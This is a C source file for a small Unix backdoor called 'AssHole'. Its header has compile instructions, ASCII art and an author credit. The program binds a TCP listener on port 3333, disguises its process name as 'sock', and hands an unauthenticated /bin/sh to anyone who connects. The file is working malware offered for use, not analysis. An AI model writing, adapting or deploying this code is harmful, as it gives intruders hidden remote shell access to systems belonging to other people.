/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~AssHole is a simple Backdor that is portable on all *NIX systems.              ~
~It runs on the port, defined in the variable "PORT" and it hides under         ~ 
~the name, defined in "HIDENAME"!                                               ~ 
~                                                                               ~
~                                                                               ~
~Compiling Information:                                                         ~ 
~AssHole was tested on various systems, using the GNU C compiler.               ~
~eg:                                                                            ~
~   #############################                                               ~                              
~   #$ gcc -o asshole asshole.c #                                               ~
~   #$ ./asshole                #                                               ~
~   #############################                                               ~                                                                            
~                                                                               ~
~Note: There is NO autostart!                                                   ~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


   #
   ##
   ###
    ####
     #####
     #######
      #######
      ########
      ########
      #########
      ##########
     ############
   ##############
  ################                                                  #
   ################                                                ##
     ##############                                               ###   
      ##############                                             ####
      ##############                                           #####
       ##############                                      #######
       ##############                                 ###########
       ###############                              #############
       ################                           ##############
      #################      #                  ################
      ##################     ##    #           #################
     ####################   ###   ##          #################
          ################  ########          #################
           ################  #######         ###################
             #######################       #####################
              #####################       ###################
                ############################################
                 ###########################################
                 ##########################################
                  ########################################
                  ########################################
                   ######################################
                   ######################################
                    ##########################      #####
                    ###  ###################           ##
                    ##    ###############              #
                    #     ##  ##########   
                              ##    ###
                                    ###
                                    ##
nova@aon.at                         #



###########################################
#(c) by ~Creepy~Nodque~ aka NoVa aka M,r;D#
###########################################
 */


#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <strings.h>
/*You*Can*Edit*These*Lines*/
#define HIDENAME "sock"
#define PORT 3333
#define EAR 5
#define SH "/bin/sh"
/*************************/
int main(int argc, char **argv)
{

  char *fst = "\nYou Are In!\n\n";
  char *sec = "AssHole,the little Backdoor written by CreepyNodque\n";
  char *thr = "*Note: Use commands followed by ';'\n";

  int outsock;
  int insock;
  int sz; 
  struct sockaddr_in home;
  struct sockaddr_in away;
  home.sin_family=AF_INET;
  home.sin_port=htons(PORT);
  home.sin_addr.s_addr=INADDR_ANY;
  bzero(&(home.sin_zero),8);
  strcpy(argv[0],HIDENAME);
  signal(SIGCHLD,SIG_IGN);

  if((outsock=socket(AF_INET,SOCK_STREAM,0))<0)
    exit(printf("Uups...You`ve got some problems with the socket!\n"));

  if((bind(outsock,(struct sockaddr *)&home,sizeof(home))<0))
    exit(printf("Uups...There is a bind error\n"));

  if((listen(outsock,EAR))<0)
    exit(printf("Uups...There is a listen error\n"));

  sz=sizeof(struct sockaddr_in);


  for(;;)
    {
      if((insock=accept(outsock,(struct sockaddr *)&away, &sz))<0)
	exit(printf("Uups...There is a accept error"));
      if(fork() !=0)
	{
	  send(insock,fst,strlen(fst),0); 
	  send(insock,sec,strlen(sec),0);
	  send(insock,thr,strlen(thr),0);
	  dup2(insock,0); 
	  dup2(insock,1); 
	  dup2(insock,2); 
	  execl(SH,SH,(char *)0); 
	  close(insock);
	  exit(0); 
	}
      close(insock);
    }
}


